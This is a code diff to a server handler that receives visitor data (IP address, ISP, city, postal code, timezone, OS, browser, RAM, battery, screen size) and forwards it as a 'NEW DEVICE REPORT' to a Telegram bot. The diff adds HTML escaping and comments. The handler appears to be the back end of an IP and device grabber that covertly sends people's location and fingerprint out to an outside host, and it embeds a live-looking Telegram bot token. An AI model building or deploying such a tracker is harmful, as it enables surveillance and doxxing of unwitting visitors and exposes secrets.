@@ -1,5 +1,6 @@
 import axios from 'axios';
 
+// Detect OS from user-agent
 function detectOS(userAgent) {
   userAgent = userAgent.toLowerCase();
   if (/windows phone/.test(userAgent)) return 'Windows Phone';
@@ -12,6 +13,14 @@ function detectOS(userAgent) {
   return 'Unknown';
 }
 
+// Escape HTML to avoid Telegram parse_mode errors
+function escapeHTML(text) {
+  return String(text)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).end('Method Not Allowed');
@@ -22,25 +31,26 @@ export default async function handler(req, res) {
   data.os = detectOS(userAgent);
   const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Manila' });
 
+  // Build Telegram message
   const message = `
 <b>📡 NEW DEVICE REPORT</b>
-<b>🕒 Time:</b> ${date}
+<b>🕒 Time:</b> ${escapeHTML(date)}
 
 <b>🌐 Network Info</b>
-• IP: ${data.ip || 'Unknown'}
-• ISP: ${data.isp || 'Unknown'}
-• Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}
-• Timezone: ${data.timezone || 'Unknown'}
-• Postal: ${data.postal || 'Unknown'}
+• IP: ${escapeHTML(data.ip || 'Unknown')}
+• ISP: ${escapeHTML(data.isp || 'Unknown')}
+• Location: ${escapeHTML(data.city || 'Unknown')}, ${escapeHTML(data.region || 'Unknown')}, ${escapeHTML(data.country || 'Unknown')}
+• Timezone: ${escapeHTML(data.timezone || 'Unknown')}
+• Postal: ${escapeHTML(data.postal || 'Unknown')}
 
 <b>💻 Device Info</b>
-• OS: ${data.os || 'Unknown'}
-• Browser: ${data.browser || 'Unknown'}
-• Mobile: ${String(data.mobile)}
-• RAM: ${data.memory ?? 'Unknown'} GB
-• Battery: ${data.battery ?? 'Unknown'}% (Charging: ${String(data.charging ?? 'Unknown')})
-• Screen: ${data.screen || 'Unknown'}
-• Viewport: ${data.viewport || 'Unknown'}
+• OS: ${escapeHTML(data.os || 'Unknown')}
+• Browser: ${escapeHTML(data.browser || 'Unknown')}
+• Mobile: ${escapeHTML(String(data.mobile))}
+• RAM: ${escapeHTML(String(data.memory ?? 'Unknown'))} GB
+• Battery: ${escapeHTML(String(data.battery ?? 'Unknown'))}% (Charging: ${escapeHTML(String(data.charging ?? 'Unknown'))})
+• Screen: ${escapeHTML(data.screen || 'Unknown')}
+• Viewport: ${escapeHTML(data.viewport || 'Unknown')}
 `;
 
   const BOT_TOKEN = '7708928004:AAESpODTC67fouiwFpneucU1QR2qRa_dmYk';
@@ -50,7 +60,7 @@ export default async function handler(req, res) {
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text: message,
-      parse_mode: 'HTML'  // <--- safer than Markdown
+      parse_mode: 'HTML'
     });
 
     console.log('[+] Sent device info to Telegram');
